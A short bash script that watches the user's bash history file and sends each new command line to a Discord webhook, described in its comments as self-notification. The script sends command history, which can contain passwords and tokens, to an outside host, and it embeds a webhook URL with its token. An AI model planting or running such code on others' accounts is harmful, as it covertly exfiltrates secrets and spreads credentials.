# How this program will work:
# 1) declare where our history directory is located
# 2) declare the discord webhook URL to send notifications
# 3) store the current items of the history contents
# 4) notify ourselves of when the file is modified
# 5) compare the difference (from the latest)
# 6) convert the difference to a JSON payload, and send the new items to the webhook
# 7) set the current files to the previous for the next loop

DIRECTORY="/home/$USER/.bash_history"
COMMAND="inotifywait -m -q -r -e modify \"$DIRECTORY\""
PREVIOUS_CONTENTS=$(cat $DIRECTORY)
WEBHOOK_URL="https://discord.com/api/webhooks/1429675371904892978/1IKGnczeckls7iptXTvlgz6WmfLZ9GmlCeypZ4_4BXhjbpAI5YdkE4VDCUqEjjAe9_Bj"

eval $COMMAND | while read full_path events file_name; do
    CURRENT_CONTENTS=$(cat $DIRECTORY)
    DIFFERENCE=$(diff --new-line-format='%L' --old-line-format='' --unchanged-line-format='' <(echo "$PREVIOUS_CONTENTS") <(echo "$CURRENT_CONTENTS"))
    PREVIOUS_CONTENTS="$CURRENT_CONTENTS"
    PAYLOAD=$(jq -Rn --arg payload "$DIFFERENCE" '{content:$payload}')

    curl $WEBHOOK_URL \
        -X POST \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD"
done